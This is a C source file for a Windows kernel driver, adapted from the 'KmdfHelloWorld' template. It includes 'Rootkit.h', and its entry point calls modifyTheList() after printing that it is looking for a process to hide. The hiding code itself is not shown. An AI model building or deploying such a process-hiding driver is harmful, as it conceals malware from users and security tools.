#include <ntddk.h>
#include <wdf.h>

#include "Rootkit.h"

DRIVER_INITIALIZE DriverEntry;
EVT_WDF_DRIVER_DEVICE_ADD KmdfHelloWorldEvtDeviceAdd;

NTSTATUS DriverEntry(
	_In_ PDRIVER_OBJECT DriverObjetct,
	_In_ PUNICODE_STRING RegistryPath
) {
	//NTSTATUS variable to record success or failure
	NTSTATUS status = STATUS_SUCCESS;

	//Allocate the driver config object
	WDF_DRIVER_CONFIG config;

	//PRint "Hello World" for DriverEntry
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "KmdfHelloWorld 1st time INFO\n"));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "KmdfHelloWorld 1st time ERROR\n"));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_WARNING_LEVEL, "KmdfHelloWorld 1st time WARNING\n"));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_TRACE_LEVEL, "KmdfHelloWorld 1st time TRACE\n"));
	KdPrint(("HELLOOOOOOOOOOOOOOOOOOOO 1\n"));

	//Initialize the driver configuration object to register 
	//the entry point for the EvtDeviceAdd callback, KmdfHelloWorldEvtDeviceAdd
	WDF_DRIVER_CONFIG_INIT(&config, KmdfHelloWorldEvtDeviceAdd);
	KdPrint(("HELLOOOOOOOOOOOOOOOOOOOO 2\n"));

	KdPrint(("START LOOKING FOR THE PROCESS TO HIDE\n"));
	modifyTheList();
	KdPrint(("Search finished\n"));

	//Finally, create driver object
	status = WdfDriverCreate(DriverObjetct, RegistryPath, WDF_NO_OBJECT_ATTRIBUTES, &config, WDF_NO_HANDLE);
	if (status != STATUS_SUCCESS) {
		KdPrint(("ERROR CREATING DRIVER!\n"));
	}
	KdPrint(("Driver Creation Successfully"));
	return status;
}

NTSTATUS KmdfHelloWorldEvtDeviceAdd(
	_In_ WDFDRIVER Driver,
	_Inout_ PWDFDEVICE_INIT DeviceInit
) {
	//We are not usint the driver object, so we need to mark it as unreferenced.
	UNREFERENCED_PARAMETER(Driver);

	NTSTATUS status;
	
	//Allocate the device object
	WDFDEVICE hDevice;

	//Print "Hello World"
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "KmdfHelloWorld 2nd time INFO\n"));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "KmdfHelloWorld 2nd time ERROR\n"));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_WARNING_LEVEL, "KmdfHelloWorld 2nd time WARNING\n"));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_TRACE_LEVEL, "KmdfHelloWorld 2nd time TRACE\n"));

	//modifyTheList();
	//Create the device object
	status = WdfDeviceCreate(&DeviceInit, WDF_NO_OBJECT_ATTRIBUTES, &hDevice);
	
	return status;
}
